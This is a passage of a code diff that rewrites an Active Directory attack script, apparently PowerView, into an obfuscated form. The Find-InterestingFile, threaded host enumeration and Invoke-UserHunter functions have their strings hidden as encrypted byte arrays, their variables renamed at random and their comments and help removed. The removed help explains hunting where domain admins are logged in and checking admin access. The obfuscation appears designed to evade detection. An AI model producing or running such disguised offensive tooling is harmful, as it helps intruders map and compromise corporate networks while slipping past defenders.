+            Write-Verbose ((ParseEntry20 @(147,174,246,187,17,160,139,183,155,162,233,20,173,158,129,201,174,201,50,243) @(199,249,207,138,115,206,217)) + $Path + (ParseEntry20 @(158,235,4,46,127,127,36,185,234,21,17,121,76,86,129,215,49,23,92,121,68,231,241,43,53,70,114,125,158,228,20,100,87,105,44,234) @(215,163,82,84,30,40,17)) + $Qh217c4)
             try {
-                $Null = New-PSDrive -Name $nXovd -Credential $Credential -PSProvider FileSystem -Root $mnwhsX0k -ErrorAction Stop
+                $Null = New-PSDrive -Name $Qh217c4 -Credential $Credential -PSProvider FileSystem -Root $RGUSl5I -ErrorAction Stop
             }
             catch {
-                Write-Debug ((HandleResult95 @(65,69,41,193,113,46,42,223,113,74,90,137,113,115,49,200,113,112,0,223,112,90,37,136,114,94,34,133) @(19,29,99,184)) + $Path + (HandleResult95 @(180,245,107,125) @(253,177,4,26,185)) + $_)
+                Write-Debug ((ParseEntry20 @(35,1,237,172,161,149,56,62,197,130,250,151,19,55,245,165,161,203,18,62,196,146,133,150,16,26,230,232) @(113,89,167,213,195,166)) + $Path + (ParseEntry20 @(71,215,238,217) @(14,147,129,190)) + $_)
                 return $Null
             }
-
-            # so we can cd/dir the new drive
-            $Path = $nXovd + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
+            $Path = $Qh217c4 + ([char]0x3a+[char]0x5c) + $FilePath
         }
     }
-
     process {
-
-        Write-Verbose ((HandleResult95 @(131,143,202,195,222,146,184,214,254,207,158,156,219,228,213,163,175,226,245,248,157,183,135,154) @(212,246,186,167,151)) + $Path)
-
+        Write-Verbose ((ParseEntry20 @(40,67,94,235,158,57,116,66,214,143,53,80,79,204,149,8,99,118,221,184,54,123,19,178) @(127,58,46,143,215)) + $Path)
         function Invoke-CheckWrite {
-            # short helper to check is the current user can write to a file
             [CmdletBinding()]param([String]$Path)
             try {
-                $FcEsz7IJ = [IO.FILE]::OpenWrite($Path)
-                $FcEsz7IJ.Close()
+                $tEkOn = [IO.FILE]::OpenWrite($Path)
+                $tEkOn.Close()
                 $True
             }
             catch {
@@ -7494,18 +3733,15 @@ function Find-InterestingFile {
                 $False
             }
         }
-
-        $fclLo =  @{
+        $BJnRkp =  @{
             'Path' = $Path
             'Recurse' = $True
             'Force' = $(-not $ExcludeHidden)
-            'Include' = $eswm
+            'Include' = $VrCC
             'ErrorAction' = 'SilentlyContinue'
         }
-
-        Get-ChildItem @fclLo | ForEach-Object {
+        Get-ChildItem @BJnRkp | ForEach-Object {
             Write-Verbose $_
-            # check if we're excluding folders
             if(!$ExcludeFolders -or !$_.PSIsContainer) {$_}
         } | ForEach-Object {
             if($LastAccessTime -or $LastWriteTime -or $CreationTime) {
@@ -7515,580 +3751,260 @@ function Find-InterestingFile {
             }
             else {$_}
         } | ForEach-Object {
-            # filter for write access (if applicable)
             if((-not $CheckWriteAccess) -or (Invoke-CheckWrite -Path $_.FullName)) {$_}
         } | Select-Object FullName,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | ForEach-Object {
-            # check if we're outputting to the pipeline or an output file
             if($OutFile) {Export-PowerViewCSV -InputObject $_ -OutFile $OutFile}
             else {$_}
         }
     }
-
     end {
-        if($UsePSDrive -and $nXovd) {
-            Write-Verbose ((HandleResult95 @(123,148,71,136,34,29,163,97,158,45,77,158,117,187,22,90,154,82,190,17,123,201,67,133,33,118,163,125,181,1,19,196) @(46,249,17,252,64)) + $nXovd)
-            Get-PSDrive -Name $nXovd -ErrorAction SilentlyContinue | Remove-PSDrive
+        if($UsePSDrive -and $Qh217c4) {
+            Write-Verbose ((ParseEntry20 @(141,111,249,217,181,235,88,223,207,186,187,101,203,234,129,172,97,236,239,134,141,50,253,212,182,128,88,195,228,150,229,63) @(216,2,175,173,215)) + $Qh217c4)
+            Get-PSDrive -Name $Qh217c4 -ErrorAction SilentlyContinue | Remove-PSDrive
         }
     }
 }
-
-
-########################################################
-#
-# 'Meta'-functions start below
-#
-########################################################
-
 function Invoke-ThreadedFunction {
-    # Helper used by any threaded host enumeration functions
     [CmdletBinding()]
     param(
         [Parameter(Position=0,Mandatory=$True)]
         [String[]]
         $ComputerName,
-
         [Parameter(Position=1,Mandatory=$True)]
         [System.Management.Automation.ScriptBlock]
         $ScriptBlock,
-
         [Parameter(Position=2)]
         [Hashtable]
         $ScriptParameters,
-
         [Int]
         $Threads = 20,
-
         [Switch]
         $NoImports
     )
-
     begin {
-
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
-
-        Write-Verbose ((HandleResult95 @(181,136,233,1,171,183,203,19,134,182,223,22,171,182,172,84,128,166,211,9,129,152,219,19,184,152,219,10,128,194,215,85,129,139,246,2) @(226,241,153,101)) + $($ComputerName.count))
-
-        # Adapted from:
-        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
-        $cAQFT9tE = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-        $cAQFT9tE.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
-
-        # import the current session state's variables and functions so the chained PowerView
-        #   functionality can be used by the threaded blocks
+        Write-Verbose ((ParseEntry20 @(135,124,70,57,140,150,87,64,57,130,150,118,127,26,240,225,103,97,23,169,179,108,116,43,159,185,71,89,63,246,158,53,85,39,170,183) @(208,5,54,93,197)) + $($ComputerName.count))
+        $gabxQFb = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+        $gabxQFb.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
         if(!$NoImports) {
-
-            # grab all the current variables for this runspace
-            $GDhTL = Get-Variable -Scope 2
-
-            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
-            $AQCOs = @("?",(HandleResult95 @(75,210,82,18,95,227,47,183) @(18,138,24,124,60,148)),(HandleResult95 @(156,13,109,215,17,60,244,76,14,247,40,126,175,120,2,237,43,89,252,83) @(205,63,84,162,114,14)),(HandleResult95 @(118,112,19,214,70,27,16,146) @(36,40,89,175)),(HandleResult95 @(86,192,202,192,1,55,206,146,205,15,61,237,243,158,97,113,252,229,250,108,96,217,159,145) @(4,152,162,172,88)),(HandleResult95 @(226,219,179,250,219,132,160,180) @(184,182,245,137)),(HandleResult95 @(160,187,186,77,47,62,219,244) @(243,254,131,3,125,111,230,201)),(HandleResult95 @(4,16,90,0,13,184,98,67) @(87,87,99,122,105,249,95,126)),(HandleResult95 @(233,208,9,139,143,205,94,181) @(136,135,60,252,235,149,15)),(HandleResult95 @(12,179,111,184,73,92,206,168,6,137,42,163,116,55,205,197) @(95,228,90,207,45,4,156,248)),(HandleResult95 @(243,217,243,31,193,208,205,103,197,219,243,88,193,208,186,44,246,188,140,26,194,233,173,107) @(167,142,181,43,160,135,252,86)),(HandleResult95 @(111,129,4,114,38,108,231,115,36,18,105,175,35,30,29,87,135,112,127,118,89,184,19,123) @(59,214,66,70,71)),(HandleResult95 @(239,96,202,97,251,6,46,26,217,98,218,44,249,60,38,82,234,5,181,100,248,63,78,22) @(187,55,140,85,154,81,31,43)),(HandleResult95 @(191,81,76,252,230,3,12,218,100,95,146,182,54,80,165,54,107,159,190,33,108,217,63,59,170,233,5,0) @(235,6,10,200,135,84,61)),(HandleResult95 @(11,249,125,163,51,104,110,159,89,194,58,79,60,157,105,225,49,81,51,234,89,164,4,74,59,239,6,170) @(95,174,59,151,82,63)),(HandleResult95 @(34,75,198,238,95,220,104,71,126,214,128,86,232,52,26,116,217,183,70,231,8,68,37,177,184,80,218,100) @(118,28,128,218,62,139,89)),(HandleResult95 @(207,161,196,105,188,245,163,222,122,236,221,201,201,116,231,238) @(155,249,168,35,222)),(HandleResult95 @(250,46,47,141,45,255,165,125) @(152,64,121,254,79,190)),(HandleResult95 @(34,126,139,70) @(119,59,231,3,49,142)),(HandleResult95 @(204,253,130,250,120,136,207,206,150,255,88,211,250,214,138,205,64,227,203,215,175,215,87,134) @(153,187,204,185,26,187)),(HandleResult95 @(38,211,49,43,233,12,136,61,42,194,74,4,222,121,255,121,18,212,66,82) @(115,149,127,111,139,62,185,73)),(HandleResult95 @(242,28,218,42,158,240,34,164,10,162,237,54) @(167,90,148,110,250)),(HandleResult95 @(171,34,133,207,19,136,134,150,0,156,242,121,138,155,184,29,146,221,120,179,184,185,50,178,220,36,153,175,154,51,157,240) @(254,100,203,138,73,223,220)),(HandleResult95 @(171,194,129,152,133,206,181,137) @(254,132,207,209,209)),(HandleResult95 @(47,32,160,69,147,242,48,22,141,89,152,146,24,84,215,33) @(122,102,238,17,202,193)),(HandleResult95 @(21,198,84,25,19,213,84,126,34,200,72,126,35,237,79,114) @(64,128,26,79)),(HandleResult95 @(188,173,153,142,23,177,161,173,184,26,208,158,129,158,11,128,137,144,140,112) @(233,235,215,217,77)),(HandleResult95 @(70,74,139,68) @(19,12,239,1,125,29,22)),(HandleResult95 @(224,143,210,67,56,4,217,255,231,251,18,103) @(181,189,186,47,90,67,161)),(HandleResult95 @(82,121,100,60,32,16,184,126,40,58,124,9,71,189,81,33,91,14,63,88,177,70,119,53) @(7,74,8,73,121,34,208)),(HandleResult95 @(1,156,9,142,0,212,172,188) @(101,212,67,191,90,133,145,129)))
-
-            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
-            ForEach($leNG in $GDhTL) {
-                if($AQCOs -NotContains $leNG.Name) {
-                $cAQFT9tE.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $leNG.name,$leNG.Value,$leNG.description,$leNG.options,$leNG.attributes))
+            $cdJXup = Get-Variable -Scope 2
+            $fdZWU = @("?",(ParseEntry20 @(144,211,220,129,182,96,39,120) @(201,139,150,239,213,23,26,69)),(ParseEntry20 @(73,88,109,236,123,88,109,234,66,63,14,233,122,45,2,214,65,61,101,245) @(24,106,84,153)),(ParseEntry20 @(226,49,17,187,178,29,165,141) @(176,105,91,194,208,46,236)),(ParseEntry20 @(58,190,170,253,28,234,172,88,135,149,168,48,136,200,81,147,166,214,19,237,158,41,219,255) @(104,230,194,145,69,217,250)),(ParseEntry20 @(210,130,218,239,206,186,186,161) @(136,239,156,156,173)),(ParseEntry20 @(118,73,42,56,133,123,77,24) @(37,12,19,118,215,42,112)),(ParseEntry20 @(117,38,203,108,55,162,27,92) @(38,97,242,22,83,227)),(ParseEntry20 @(56,107,246,10,152,1,109,254) @(89,60,195,125,252)),(ParseEntry20 @(18,112,13,130,49,39,169,17,126,85,133,57,38,200,16,26) @(65,39,56,245,85,127,251)),(ParseEntry20 @(206,141,36,68,231,55,154,171,184,55,54,245,1,252,220,160,51,66,191,81,201,244,139,95) @(154,218,98,112,134,96,171)),(ParseEntry20 @(139,234,18,96,190,234,101,101,189,232,6,45,190,229,14,56,142,143,109,101,189,211,5,105) @(223,189,84,84)),(ParseEntry20 @(149,3,61,231,40,223,144,240,54,46,133,48,235,204,248,45,42,225,112,185,195,175,5,70) @(193,84,123,211,73,136,161)),(ParseEntry20 @(194,35,152,197,247,35,239,192,244,33,132,192,244,25,144,193,247,35,231,132,199,70,231,192,244,26,143,204) @(150,116,222,241)),(ParseEntry20 @(209,59,233,210,228,59,158,215,231,57,199,150,230,95,253,144,230,2,195,162,231,95,249,147,225,45,146,219) @(133,108,175,230)),(ParseEntry20 @(207,60,90,62,250,60,45,59,249,61,70,98,248,6,112,98,194,6,100,102,202,89,37,59,249,5,77,55) @(155,107,28,10)),(ParseEntry20 @(35,144,209,121,20,160,167,86,46,250,251,3,23,153,196,85) @(119,200,189,51,118,206,253,32)),(ParseEntry20 @(11,106,142,85,4,86,70,146) @(105,4,216,38,102,23,123,175)),(ParseEntry20 @(214,90,106,189) @(131,31,6,248,78,242,214,46)),(ParseEntry20 @(178,191,187,22,124,212,175,128,15,88,165,145,150,56,88,147,163,173,7,114,132,151,184,104) @(231,249,245,85,30)),(ParseEntry20 @(161,57,104,91,161,1,197,11,127,72,246,88,161,56,96,47,162,114,201,66) @(244,127,38,31,195,51)),(ParseEntry20 @(31,240,94,53,152,159,241,239,46,238,90,29) @(74,182,16,113,252,200,137,223)),(ParseEntry20 @(150,178,32,123,117,208,162,171,144,57,70,31,210,191,133,141,55,105,30,235,156,132,162,23,104,66,193,139,167,163,56,68) @(195,244,110,62,47,135,248)),(ParseEntry20 @(70,76,103,218,111,33,109,229) @(19,10,41,147,59,17,92,163)),(ParseEntry20 @(46,1,65,38,34,116,69,2,24,15,93,33,25,117,54,66) @(123,71,15,114)),(ParseEntry20 @(36,169,120,242,218,23,8,83,19,167,100,149,234,47,19,95) @(113,239,54,164,137,66,70,98)),(ParseEntry20 @(90,48,209,116,85,46,213,89,110,33,166,86,89,49,217,74,109,49,202,30) @(15,118,159,35)),(ParseEntry20 @(135,144,23,139) @(210,214,115,206,37,207)),(ParseEntry20 @(198,60,176,36,27,222,235,68,130,9,68,164) @(147,14,216,72,121,153)),(ParseEntry20 @(228,163,39,114,60,151,217,233,41,53,80,213,212,253,29,108,54,226,247,234,42,70,88,152) @(177,144,75,7,101,165)),(ParseEntry20 @(19,31,45,38,175,38,106,90) @(119,87,103,23,245)))
+            ForEach($g5RBtR in $cdJXup) {
+                if($fdZWU -NotContains $g5RBtR.Name) {
+                $gabxQFb.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $g5RBtR.name,$g5RBtR.Value,$g5RBtR.description,$g5RBtR.options,$g5RBtR.attributes))
                 }
             }
-
-            # Add Functions from current runspace to the InitialSessionState
-            ForEach($xAasLS2 in (Get-ChildItem Function:)) {
-                $cAQFT9tE.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $xAasLS2.Name, $xAasLS2.Definition))
+            ForEach($ISXuen in (Get-ChildItem Function:)) {
+                $gabxQFb.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ISXuen.Name, $ISXuen.Definition))
             }
         }
-
-        # threading adapted from
-        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
-        #   Thanks Carlos!
-
-        # create a pool of maxThread runspaces
-        $VqFs = [runspacefactory]::CreateRunspacePool(1, $Threads, $cAQFT9tE, $Host)
-        $VqFs.Open()
-
-        $ht59LS = @()
+        $LCF6 = [runspacefactory]::CreateRunspacePool(1, $Threads, $gabxQFb, $Host)
+        $LCF6.Open()
+        $kcx2dbQ = @()
         $PS = @()
-        $jyjWpx9 = @()
-
-        $ypmBN = 0
+        $hzxpNZx2 = @()
+        $o6bG = 0
     }
-
     process {
-
-        ForEach ($fa0ya in $ComputerName) {
-
-            # make sure we get a server name
-            if ($fa0ya -ne '') {
-                # Write-Verbose "[*] Enumerating server $Computer ($($Counter+1) of $($ComputerName.count))"
-
-                While ($($VqFs.GetAvailableRunspaces()) -le 0) {
+        ForEach ($mnZ6k in $ComputerName) {
+            if ($mnZ6k -ne '') {
+                While ($($LCF6.GetAvailableRunspaces()) -le 0) {
                     Start-Sleep -MilliSeconds 500
                 }
-
-                # create a "powershell pipeline runner"
                 $PS += [powershell]::create()
-
-                $PS[$ypmBN].runspacepool = $VqFs
-
-                # add the script block + arguments
-                $Null = $PS[$ypmBN].AddScript($ScriptBlock).AddParameter('ComputerName', $fa0ya)
+                $PS[$o6bG].runspacepool = $LCF6
+                $Null = $PS[$o6bG].AddScript($ScriptBlock).AddParameter('ComputerName', $mnZ6k)
                 if($ScriptParameters) {
-                    ForEach ($XVfN in $ScriptParameters.GetEnumerator()) {
-                        $Null = $PS[$ypmBN].AddParameter($XVfN.Name, $XVfN.Value)
+                    ForEach ($BZX4S9b in $ScriptParameters.GetEnumerator()) {
+                        $Null = $PS[$o6bG].AddParameter($BZX4S9b.Name, $BZX4S9b.Value)
                     }
                 }
-
-                # start job
-                $ht59LS += $PS[$ypmBN].BeginInvoke();
-
-                # store wait handles for WaitForAll call
-                $jyjWpx9 += $ht59LS[$ypmBN].AsyncWaitHandle
+                $kcx2dbQ += $PS[$o6bG].BeginInvoke();
+                $hzxpNZx2 += $kcx2dbQ[$o6bG].AsyncWaitHandle
             }
-            $ypmBN = $ypmBN + 1
+            $o6bG = $o6bG + 1
         }
     }
-
     end {
-
-        Write-Verbose (HandleResult95 @(107,36,41,127,147,122,122,26,85,142,127,123,13,60,190,90,117,93,65,159,95,123,90,127,149,80,117,8,107,176,85,111,53,88,177,86,117,22,77,199,95,111,45,98,150,106,35,31,108,197,90,99,35,102,195,0) @(61,22,111,15,247))
-
-        $CcQndXrx = Get-Date
-
-        # set a 60 second timeout for the scanning threads
-        while ($($ht59LS | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $CcQndXrx).totalSeconds) -gt 60) {
+        Write-Verbose (ParseEntry20 @(220,70,144,111,114,205,24,163,69,111,200,25,180,44,95,237,23,228,81,126,232,25,227,111,116,231,23,177,123,81,226,13,140,72,80,225,23,175,93,38,232,13,148,114,119,221,65,166,124,36,237,1,154,118,34,183) @(138,116,214,31,22))
+        $T7rY = Get-Date
+        while ($($kcx2dbQ | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $T7rY).totalSeconds) -gt 60) {
                 Start-Sleep -MilliSeconds 500
             }
-
-        # end async call
-        for ($mJAt = 0; $mJAt -lt $ypmBN; $mJAt++) {
-
+        for ($e07uf = 0; $e07uf -lt $o6bG; $e07uf++) {
             try {
-                # complete async job
-                $PS[$mJAt].EndInvoke($ht59LS[$mJAt])
-
+                $PS[$e07uf].EndInvoke($kcx2dbQ[$e07uf])
             } catch {
-                Write-Warning ((HandleResult95 @(243,103,246,187,131,54,224,9,245,131,220,56) @(169,63,188,194,225,5)) + $_)
+                Write-Warning ((ParseEntry20 @(74,198,182,40,69,250,132,38,215,189,108,26) @(16,158,252,81,39,201,205)) + $_)
             }
             finally {
-                $PS[$mJAt].Dispose()
+                $PS[$e07uf].Dispose()
             }
         }
-        
-        $VqFs.Dispose()
-        Write-Verbose (HandleResult95 @(39,195,108,223,12,131,101,25,247,121,250,45,145,127,59,243,77,158,124,191,84,49,236,120,200,2,157,92,63,197,41,145) @(118,148,20,172,69,203,55))
+        $LCF6.Dispose()
+        Write-Verbose (ParseEntry20 @(63,214,199,84,178,107,68,238,13,236,233,79,161,107,91,230,55,179,134,83,152,100,110,237,10,198,233,76,178,114,43,188) @(110,129,191,39,251,35,22,129))
     }
 }
-
-
 function Invoke-UserHunter {
-<#
-    .SYNOPSIS
-
-        Finds which machines users of a specified group are logged into.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        This function finds the local domain name for a host using Get-NetDomain,
-        queries the domain for users of a specified group (default "domain admins")
-        with Get-NetGroupMember or reads in a target user list, queries the domain for all
-        active machines with Get-NetComputer or reads in a pre-populated host list,
-        randomly shuffles the target list, then for each server it gets a list of
-        active users with Get-NetSession/Get-NetLoggedon. The found user list is compared
-        against the target list, and a status message is displayed for any hits.
-        The flag -CheckAccess will check each positive host to see if the current
-        user has local admin access to the machine.
-
-    .PARAMETER ComputerName
-
-        Host array to enumerate, passable on the pipeline.
-
-    .PARAMETER ComputerFile
-
-        File of hostnames/IPs to search.
-
-    .PARAMETER ComputerFilter
-
-        Host filter name to query AD for, wildcards accepted.
-
-    .PARAMETER ComputerADSpath
-
-        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER Unconstrained
-
-        Switch. Only enumerate computers that have unconstrained delegation.
-
-    .PARAMETER GroupName
-
-        Group name to query for target users.
-
-    .PARAMETER TargetServer
-
-        Hunt for users who are effective local admins on a target server.
-
-    .PARAMETER UserName
-
-        Specific username to search for.
-
-    .PARAMETER UserFilter
-
-        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"
-
-    .PARAMETER UserADSpath
-
-        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER UserFile
-
-        File of usernames to search for.
-
-    .PARAMETER AdminCount
-
-        Switch. Hunt for users with adminCount=1.
-
-    .PARAMETER AllowDelegation
-
-        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'
-
-    .PARAMETER StopOnSuccess
-
-        Switch. Stop hunting after finding after finding a target user.
-
-    .PARAMETER NoPing
-
-        Don't ping each host to ensure it's up before enumerating.
-
-    .PARAMETER CheckAccess
-
-        Switch. Check if the current user has local admin access to found machines.
-
-    .PARAMETER Delay
-
-        Delay between enumerating hosts, defaults to 0
-
-    .PARAMETER Jitter
-
-        Jitter for the host delay, defaults to +/- 0.3
-
-    .PARAMETER Domain
-
-        Domain for query for machines, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ShowAll
-
-        Switch. Return all user location results, i.e. Invoke-UserView functionality.
-
-    .PARAMETER SearchForest
-
-        Switch. Search all domains in the forest for target users instead of just
-        a single domain.
-
-    .PARAMETER Stealth
-
-        Switch. Only enumerate sessions from connonly used target servers.
-
-    .PARAMETER StealthSource
-
-        The source of target servers to use, 'DFS' (distributed file servers),
-        'DC' (domain controllers), 'File' (file servers), or 'All'
-
-    .PARAMETER ForeignUsers
-
-        Switch. Only return results that are not part of searched domain.
-
-    .PARAMETER Threads
-
-        The maximum concurrent threads to execute.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-UserHunter -CheckAccess
-
-        Finds machines on the local domain where domain admins are logged into
-        and checks if the current user has local administrator access.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-UserHunter -Domain 'testing'
-
-        Finds machines on the 'testing' domain where domain admins are logged into.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-UserHunter -Threads 20
-
-        Multi-threaded user hunting, replaces Invoke-UserHunterThreaded.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-UserHunter -UserFile users.txt -ComputerFile hosts.txt
-
-        Finds machines in hosts.txt where any members of users.txt are logged in
-        or have sessions.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-UserHunter -GroupName "Power Users" -Delay 60
-
-        Find machines on the domain where members of the "Power Users" groups are
-        logged into with a 60 second (+/- *.3) randomized delay between
-        touching each host.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-UserHunter -TargetServer FILESERVER
-
-        Query FILESERVER for useres who are effective local administrators using
-        Get-NetLocalGroup -Recurse, and hunt for that user set on the network.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-UserHunter -SearchForest
-
-        Find all machines in the current forest where domain admins are logged in.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-UserHunter -Stealth
-
-        Executes old Invoke-StealthUserHunter functionality, enumerating commonly
-        used servers and checking just sessions for each.
-
-    .LINK
-        http://blog.harmj0y.net
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [Alias('Hosts')]
         [String[]]
         $ComputerName,
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $ComputerFilter,
-
         [String]
         $ComputerADSpath,
-
         [Switch]
         $Unconstrained,
-
         [String]
         $GroupName = 'Domain Admins',
-
         [String]
         $TargetServer,
-
         [String]
         $UserName,
-
         [String]
         $UserFilter,
-
         [String]
         $UserADSpath,
-
         [ValidateScript({Test-Path -Path $_ })]
         [String]
         $UserFile,
-
         [Switch]
         $AdminCount,
-
         [Switch]
         $AllowDelegation,
-
         [Switch]
         $CheckAccess,
-
         [Switch]
         $StopOnSuccess,
-
         [Switch]
         $NoPing,
-
         [UInt32]
         $Delay = 0,
-
         [Double]
         $Jitter = .3,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $ShowAll,
-
         [Switch]
         $SearchForest,
-
         [Switch]
         $Stealth,
-
         [String]
-        [ValidateSet((HandleResult95 @(158,242,211,24) @(204,183,137,76)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))),(HandleResult95 @(122,137,54,252,114,181,103,178) @(40,228,90,143)),(HandleResult95 @(231,50,225,255) @(182,101,153,140,148,78,214)))]
-        $StealthSource =(HandleResult95 @(242,55,171,248) @(163,96,211,139,229,103,119,55)),
-
+        [ValidateSet((ParseEntry20 @(119,184,40,225) @(37,253,114,181,121,191)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))),(ParseEntry20 @(156,173,139,27,184,159,253,218) @(206,192,231,104,226)),(ParseEntry20 @(58,13,229,131) @(107,90,157,240,98,191)))]
+        $StealthSource =(ParseEntry20 @(193,157,47,151) @(144,202,87,228,195,141)),
         [Switch]
         $ForeignUsers,
-
         [ValidateRange(1,100)] 
         [Int]
         $Threads
     )
-
     begin {
-
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
-
-        # random object for delay
-        $WLAr = New-Object System.Random
-
-        Write-Verbose ((HandleResult95 @(62,21,120,210,119,47,38,57,212,83,92,28,106,219,93,14,63,95,131,12,11,94,124,218,114,63,58,114,236,102,35,37,108,225,11,89,54,80,255,89,13,94,100,134,95,42,46,99,236,105,17,4,109,229,124,31,54,97,247,3) @(105,108,8,182,62)) + $Delay)
-
+        $BiHWqPVB = New-Object System.Random
+        Write-Verbose ((ParseEntry20 @(136,108,218,15,150,83,224,90,189,120,159,27,189,120,201,12,140,66,159,89,189,39,222,7,147,67,252,17,133,77,224,34,187,66,159,91,133,77,227,12,187,39,198,91,190,86,232,0,133,66,210,3,186,70,232,29,133,124,235,86) @(223,21,170,107)) + $Delay)
         if($Domain) {
-            $ajPzEg = @($Domain)
+            $k8fkcV = @($Domain)
         }
         elseif($SearchForest) {
-            # get ALL the domains in the forest to search
-            $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
+            $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
         }
         else {
-            # use the local domain
-            $ajPzEg = @( (Get-NetDomain).name )
+            $k8fkcV = @( (Get-NetDomain).name )
         }
-
-        #####################################################
-        #
-        # First we build the host target set
-        #
-        #####################################################
-
         if(!$ComputerName) { 
             [Array]$ComputerName = @()
-            
             if($ComputerFile) {
-                # if we're using a host list, read the targets in and add them to the target list
                 $ComputerName = Get-Content -Path $ComputerFile
             }
             elseif($Stealth) {
-                Write-Verbose (HandleResult95 @(110,211,103,221,98,183,77,129,90,163,119,197,89,210,103,221,114,179,119,247,89,142,99,197,97,184,127,217,95,167,89,196,97,153,119,219,89,210,4,197,89,210,0,194,94,179,119,128,88,210,99,218,114,168,123,221,88,142,111,221,88,142,120,140) @(59,224,53,177))
-                Write-Verbose ((HandleResult95 @(90,101,254,227,45,64,136,95,110,21,238,245,22,36,166,22,86,100,249,185,61,86,205,82) @(15,86,172,143,116,23,240,111)) + $StealthSource)
-
-                ForEach ($Domain in $ajPzEg) {
-                    if (($StealthSource -eq (HandleResult95 @(209,185,192,14,217,133,145,64) @(131,212,172,125))) -or ($StealthSource -eq (HandleResult95 @(120,182,163,6) @(41,225,219,117)))) {
-                        Write-Verbose ((HandleResult95 @(195,20,14,72,4,52,251,165,55,38,102,120,19,234,161,3,55,107,31,4,223,195,43,14,78,36,51,128) @(148,109,126,44,77,114,189)) + $Domain + (HandleResult95 @(84,243,148,49,126,221,140,0,124,227,182,43,84,242,128,43,126,218,148,43,126,218,131,50,81,221,250,122) @(29,180,206,71)))
+                Write-Verbose (ParseEntry20 @(217,67,76,155,140,219,8,46,150,150,206,4,124,197,135,224,57,77,181,147,238,30,72,131,143,212,58,118,147,146,224,5,68,142,151,230,18,44,198,161,238,66,43,132,176,223,50,47,148,231,218,27,87,191,155,224,19,112,173,185,239,30,83,202) @(140,112,30,247,213))
+                Write-Verbose ((ParseEntry20 @(65,133,97,68,77,225,75,24,117,245,113,82,118,133,101,81,77,132,102,30,93,247,14,21) @(20,182,51,40)) + $StealthSource)
+                ForEach ($Domain in $k8fkcV) {
+                    if (($StealthSource -eq (ParseEntry20 @(154,11,249,80,89,100,16,105) @(200,102,149,35,3,53,45,84))) -or ($StealthSource -eq (ParseEntry20 @(36,113,203,177) @(117,38,179,194,133,124,244,217)))) {
+                        Write-Verbose ((ParseEntry20 @(250,15,157,49,133,13,208,156,44,181,31,249,42,193,152,24,164,18,158,61,244,250,48,157,55,165,10,171) @(173,118,237,85,204,75,150)) + $Domain + (ParseEntry20 @(35,234,52,163,9,196,44,146,11,250,22,185,35,235,32,185,9,195,52,185,9,195,35,160,38,196,90,232) @(106,173,110,213)))
                         $ComputerName += Get-NetFileServer -Domain $Domain -DomainController $DomainController
                     }
-                    if (($StealthSource -eq (HandleResult95 @(181,21,8,110) @(231,80,82,58))) -or ($StealthSource -eq (HandleResult95 @(116,37,221,22) @(37,114,165,101,122,118,252)))) {
-                        Write-Verbose ((HandleResult95 @(101,6,122,16,71,116,57,59,46,86,120,74,107,35,59,92,54,77,38,120,80,40,76,4,108,91,62,55) @(50,127,10,116,14)) + $Domain + (HandleResult95 @(76,232,211,144,255,108,237,204,180,240,72,200,220,212,202,124,203,228,176,229,102,214,189,147,208,98,146,180) @(5,175,137,230,156)))
+                    if (($StealthSource -eq (ParseEntry20 @(98,73,150,199) @(48,12,204,147,119,41,235,165))) -or ($StealthSource -eq (ParseEntry20 @(86,251,234,28) @(7,172,146,111,227,70,45,46)))) {
